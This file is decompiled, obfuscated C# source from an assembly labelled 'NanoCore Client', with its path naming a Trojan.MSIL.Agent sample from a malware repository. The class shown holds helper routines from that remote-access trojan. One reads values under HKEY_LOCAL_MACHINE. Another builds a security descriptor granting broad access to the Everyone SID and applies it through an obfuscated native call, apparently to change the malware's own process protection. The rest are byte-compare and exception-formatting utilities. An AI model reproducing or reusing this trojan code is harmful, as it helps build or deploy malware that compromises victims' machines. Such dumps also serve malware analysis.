// Decompiled with JetBrains decompiler
// Type: #=qxb6WVOMh6wjcZFY_Q0MJOQ==
// Assembly: NanoCore Client, Version=1.2.2.0, Culture=neutral, PublicKeyToken=null
// MVID: 426FFF4D-C208-4BDC-B784-E45B84513C2D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\Trojan.MSIL.Agent.fpar-6aa61499adefcd76ad8823093774389edc9064f2da07d150f4defb14eea45c50.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;

[StandardModule]
internal sealed class \u0023\u003Dqxb6WVOMh6wjcZFY_Q0MJOQ\u003D\u003D
{
  public static string \u0023\u003Dq9DR9MBj4z9rQMPU2Q48EqjtFhU8AMGWHK02_s7IakJ8\u003D(
    string _param0,
    string _param1)
  {
    IntPtr num1;
    if (\u0023\u003DqjryTBW16mUfo_ItH9KWoGQ\u003D\u003D.\u0023\u003DqCKX0qzAtjLAL9KBPrJWkOA\u003D\u003D(new UIntPtr(2147483650U), _param0, 0, 131353, ref num1) != 0)
      return string.Empty;
    if (true)
      goto label_5;
label_3:
    IntPtr num2 = num1;
    string str1 = _param1;
    if (true)
      goto label_6;
label_4:
    int num3;
    ref int local1 = ref num3;
    StringBuilder stringBuilder1;
    StringBuilder stringBuilder2 = stringBuilder1;
    int capacity;
    ref int local2 = ref capacity;
    if (\u0023\u003DqjryTBW16mUfo_ItH9KWoGQ\u003D\u003D.\u0023\u003DqsqmAgLqQh_pOiJq5Mcf5Ii66zl6iLnAX8VtqTy\u0024uxhY\u003D(num2, str1, 0, ref local1, stringBuilder2, ref local2) == 0)
    {
      StringBuilder stringBuilder3 = new StringBuilder(capacity);
      if (true)
        goto label_9;
label_8:
      IntPtr num4 = num1;
      string str2 = _param1;
      int num5 = 0;
      ref int local3 = ref num5;
      StringBuilder stringBuilder4 = stringBuilder1;
      ref int local4 = ref capacity;
      \u0023\u003DqjryTBW16mUfo_ItH9KWoGQ\u003D\u003D.\u0023\u003DqsqmAgLqQh_pOiJq5Mcf5Ii66zl6iLnAX8VtqTy\u0024uxhY\u003D(num4, str2, 0, ref local3, stringBuilder4, ref local4);
      goto label_10;
label_9:
      stringBuilder1 = stringBuilder3;
      goto label_8;
    }
label_10:
    \u0023\u003DqjryTBW16mUfo_ItH9KWoGQ\u003D\u003D.\u0023\u003DqrmavK4kbgFTgX3_IUlEoRw\u003D\u003D(num1);
    return stringBuilder1 == null ? string.Empty : stringBuilder1.ToString();
label_6:
    num3 = 0;
    goto label_4;
label_5:
    stringBuilder1 = (StringBuilder) null;
    goto label_3;
  }

  public static bool \u0023\u003DqiY1B9yU2oVkPHxhn\u0024y67SFTP8x1Jb0botGqdUGkdpQg\u003D()
  {
    bool flag;
    try
    {
      RawSecurityDescriptor securityDescriptor1 = \u0023\u003Dqxb6WVOMh6wjcZFY_Q0MJOQ\u003D\u003D.\u0023\u003DqNz_Hz8DMWPqA8pVcg8d0UVymwvCurvyYgdZaMK3OhQE\u003D();
      if (true)
        goto label_4;
label_1:
      SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.WorldSid, (SecurityIdentifier) null);
      if (true)
        goto label_5;
label_2:
      SecurityIdentifier sid;
      CommonAce commonAce = new CommonAce(AceFlags.None, AceQualifier.AccessAllowed, 2035707, sid, false, (byte[]) null);
      if (true)
        goto label_6;
label_3:
      RawSecurityDescriptor securityDescriptor2;
      CommonAce ace;
      securityDescriptor2.DiscretionaryAcl.InsertAce(0, (GenericAce) ace);
      flag = \u0023\u003Dqxb6WVOMh6wjcZFY_Q0MJOQ\u003D\u003D.\u0023\u003Dq\u0024JqWZLd6UPV3jmsDHksd2EmkHWISQtPlvGx8vZ7hHXE\u003D(securityDescriptor2);
      goto label_8;
label_6:
      ace = commonAce;
      goto label_3;
label_5:
      sid = securityIdentifier;
      goto label_2;
label_4:
      securityDescriptor2 = securityDescriptor1;
      goto label_1;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      \u0023\u003DqjIje6jGWLd2EOkfZXKqBbg\u003D\u003D.\u0023\u003DqqRc2eOIidDtWq4y7W2lAhSyv\u0024pBRJdAsYlXSRUcwizw\u003D(ex, \u0023\u003DqnB6QgyVNIUL\u0024Uq0GD3p5d7LpaFZvHrB3jSqhv3o7qlE\u003D.\u0023\u003Dq00kXQ\u00240a\u0024SV9DIgRtf4NWQ\u003D\u003D(516960006));
      flag = false;
      ProjectData.ClearProjectError();
    }
label_8:
    return flag;
  }

  public static bool \u0023\u003Dq3S7bY847GmpPliI1m7tZaAVifJNdeHclZJyeY2JTxN8\u003D()
  {
    bool flag;
    try
    {
      int num = \u0023\u003Dqxb6WVOMh6wjcZFY_Q0MJOQ\u003D\u003D.\u0023\u003Dq\u0024JqWZLd6UPV3jmsDHksd2EmkHWISQtPlvGx8vZ7hHXE\u003D(\u0023\u003Dqxb6WVOMh6wjcZFY_Q0MJOQ\u003D\u003D.\u0023\u003DqNz_Hz8DMWPqA8pVcg8d0UVymwvCurvyYgdZaMK3OhQE\u003D()) ? 1 : 0;
      if (true)
        flag = num != 0;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      if (true)
        goto label_5;
label_3:
      Exception exception;
      \u0023\u003DqjIje6jGWLd2EOkfZXKqBbg\u003D\u003D.\u0023\u003DqqRc2eOIidDtWq4y7W2lAhSyv\u0024pBRJdAsYlXSRUcwizw\u003D(exception, \u0023\u003DqnB6QgyVNIUL\u0024Uq0GD3p5d7LpaFZvHrB3jSqhv3o7qlE\u003D.\u0023\u003Dq00kXQ\u00240a\u0024SV9DIgRtf4NWQ\u003D\u003D(516960040));
      if (true)
        goto label_6;
label_4:
      ProjectData.ClearProjectError();
      goto label_7;
label_6:
      flag = false;
      goto label_4;
label_5:
      exception = ex;
      goto label_3;
    }
label_7:
    return flag;
  }

  private static RawSecurityDescriptor \u0023\u003DqNz_Hz8DMWPqA8pVcg8d0UVymwvCurvyYgdZaMK3OhQE\u003D()
  {
    DiscretionaryAcl discretionaryAcl1 = new DiscretionaryAcl(false, false, 0);
    if (true)
      goto label_3;
label_1:
    DiscretionaryAcl discretionaryAcl2;
    byte[] numArray = new byte[discretionaryAcl2.BinaryLength - 1 + 1];
    if (true)
      goto label_4;
label_2:
    byte[] binaryForm;
    discretionaryAcl2.GetBinaryForm(binaryForm, 0);
    return new RawSecurityDescriptor(ControlFlags.DiscretionaryAclPresent, (SecurityIdentifier) null, (SecurityIdentifier) null, (RawAcl) null, new RawAcl(binaryForm, 0));
label_4:
    binaryForm = numArray;
    goto label_2;
label_3:
    discretionaryAcl2 = discretionaryAcl1;
    goto label_1;
  }

  private static bool \u0023\u003Dq\u0024JqWZLd6UPV3jmsDHksd2EmkHWISQtPlvGx8vZ7hHXE\u003D(
    RawSecurityDescriptor _param0)
  {
    byte[] numArray = new byte[_param0.BinaryLength - 1 + 1];
    if (true)
      goto label_2;
label_1:
    byte[] binaryForm;
    _param0.GetBinaryForm(binaryForm, 0);
    return \u0023\u003DqjryTBW16mUfo_ItH9KWoGQ\u003D\u003D.\u0023\u003DqCgskv3QU4cEy8M7hqvNNBbFyow\u0024DvbmSQrN8A5JJJWs\u003D(\u0023\u003DqWrm21vQ8CBMZP_RBTwpusA\u003D\u003D.\u0023\u003Dq3LvM\u0024oW1poDdLKDT_N_s4w\u003D\u003D, 4, binaryForm);
label_2:
    binaryForm = numArray;
    goto label_1;
  }

  public static bool \u0023\u003DqtNbB44E34Ui_i5yJYQ5ntw\u003D\u003D(byte[] _param0, byte[] _param1)
  {
    if (_param0.Length != _param1.Length)
      return false;
    int num1 = _param1.Length - 1;
    if (true)
      goto label_4;
label_3:
    int index;
    if (true)
      index = 0;
    int num2;
    while (index <= num2)
    {
      if ((int) _param0[index] != (int) _param1[index])
        return false;
      int num3 = index + 1;
      if (true)
        index = num3;
    }
    return true;
label_4:
    num2 = num1;
    goto label_3;
  }

  public static string \u0023\u003DqxQTn_t1ZFKKNm77mQ5vH9cInicm2Cv9jGtv9vmIpksI\u003D(
    Exception _param0)
  {
    string str1 = \u0023\u003Dqxb6WVOMh6wjcZFY_Q0MJOQ\u003D\u003D.\u0023\u003Dq6OqJPhANvYfkdc5uh_IKsUbLoI4zVFCxs4fpu7Vxr_U\u003D(_param0);
    if (true)
      goto label_2;
label_1:
    string str2;
    if (str2.Length > 4096)
    {
      string str3 = str2.Remove(4093) + \u0023\u003DqnB6QgyVNIUL\u0024Uq0GD3p5d7LpaFZvHrB3jSqhv3o7qlE\u003D.\u0023\u003Dq00kXQ\u00240a\u0024SV9DIgRtf4NWQ\u003D\u003D(516960456);
      if (true)
        str2 = str3;
    }
    return str2;
label_2:
    str2 = str1;
    goto label_1;
  }

  private static string \u0023\u003Dq6OqJPhANvYfkdc5uh_IKsUbLoI4zVFCxs4fpu7Vxr_U\u003D(
    Exception _param0)
  {
    StringBuilder stringBuilder1 = new StringBuilder();
    if (true)
      goto label_2;
label_1:
    StringBuilder stringBuilder2;
    stringBuilder2.AppendLine(_param0.Message);
    stringBuilder2.AppendLine();
    stringBuilder2.AppendLine(_param0.GetType().FullName);
    stringBuilder2.AppendLine(_param0.StackTrace);
    if (_param0.InnerException != null)
    {
      stringBuilder2.AppendLine();
      stringBuilder2.AppendLine(\u0023\u003Dqxb6WVOMh6wjcZFY_Q0MJOQ\u003D\u003D.\u0023\u003Dq6OqJPhANvYfkdc5uh_IKsUbLoI4zVFCxs4fpu7Vxr_U\u003D(_param0.InnerException));
    }
    return stringBuilder2.ToString();
label_2:
    stringBuilder2 = stringBuilder1;
    goto label_1;
  }
}
